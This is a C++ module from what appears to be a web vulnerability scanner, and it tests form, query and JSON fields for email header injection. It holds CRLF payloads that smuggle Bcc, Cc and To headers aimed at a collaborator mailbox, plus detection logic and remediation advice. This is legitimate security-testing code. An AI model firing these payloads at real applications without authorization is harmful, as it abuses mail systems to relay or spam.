#include "../scanner_module.hpp"
#include "../collaborator.hpp"

#include "../../../../helpers/diag_log.hpp"

#include <algorithm>
#include <cctype>
#include <string>
#include <utility>
#include <vector>

namespace aida {
namespace burp {
namespace scanner {

namespace {

std::string collaborator_mailbox(const std::string& token)
{
    auto cfg = collaborator::current_config();
    const std::string host = cfg.public_host.empty() ? std::string("invalid") : cfg.public_host;
    return token + "@" + host;
}

bool looks_email_point(const insertion_point_t& ip)
{
    const std::string n = [&]() {
        std::string s = ip.name;
        std::transform(s.begin(), s.end(), s.begin(), [](unsigned char c) { return static_cast<char>(std::tolower(c)); });
        return s;
    }();
    return n.find("email") != std::string::npos || n.find("mail") != std::string::npos ||
           n.find("to") == 0 || n.find("recipient") != std::string::npos ||
           ip.original_value.find('@') != std::string::npos;
}

std::vector<probe_t> email_injection_probes(const insertion_point_t& ip, const module_context_t&)
{
    diag::log_tagged_fmt("mod_email_inj", "probes entry ip=%s:%s", ip.kind.c_str(), ip.name.c_str());
    std::vector<probe_t> out;
    if (ip.kind != "query" && ip.kind != "body" && ip.kind != "json") return out;
    if (!looks_email_point(ip)) return out;
    const std::string token = collaborator::generate_token();
    if (token.empty()) return out;
    const std::string mailbox = collaborator_mailbox(token);
    out.push_back({ "victim@example.com\r\nBcc: " + mailbox, token, "crlf-bcc" });
    out.push_back({ "victim@example.com%0d%0aCc:%20" + mailbox, token, "encoded-crlf-cc" });
    out.push_back({ "\"victim@example.com\"\r\nTo: " + mailbox, token, "quoted-crlf-to" });
    out.push_back({ "victim@example.com\nBcc: " + mailbox, token, "lf-bcc" });
    return out;
}

std::optional<issue_t> email_injection_detect(const insertion_point_t& ip, const probe_t& probe,
                                              const exchange_observed_t& resp, const module_context_t& ctx)
{
    const auto interactions = collaborator::poll_by_token(probe.marker);
    diag::log_tagged_fmt("mod_email_inj", "detect variant=%s token_len=%zu interactions=%zu",
        probe.variant.c_str(), probe.marker.size(), interactions.size());
    if (interactions.empty()) return std::nullopt;
    bool smtp = false;
    for (const auto& it : interactions) {
        if (it.kind == "smtp") smtp = true;
    }
    if (!smtp) return std::nullopt;
    auto iss = make_issue("email-injection.smtp-collaborator",
                          "Email header injection confirmed",
                          severity_t::high, confidence_t::certain, ip, probe, resp, ctx,
                          "Collaborator SMTP interaction observed for injected recipient token");
    iss.description = "A CRLF email-header payload caused the application to send mail to a scanner-controlled collaborator recipient.";
    iss.remediation = "Reject CR/LF in email address fields, parse addresses with a strict mail-address library, and construct message headers through safe API fields rather than string concatenation.";
    iss.cwe.push_back("CWE-93");
    iss.cwe.push_back("CWE-113");
    return iss;
}

bool register_self()
{
    module_t m;
    m.id = "email-injection";
    m.name = "Email Header Injection";
    m.category = "Injection";
    m.max_probes_per_point = 4;
    m.probes = email_injection_probes;
    m.detect = email_injection_detect;
    return register_module(std::move(m));
}

const bool s_registered = register_self();

}

}
}
}
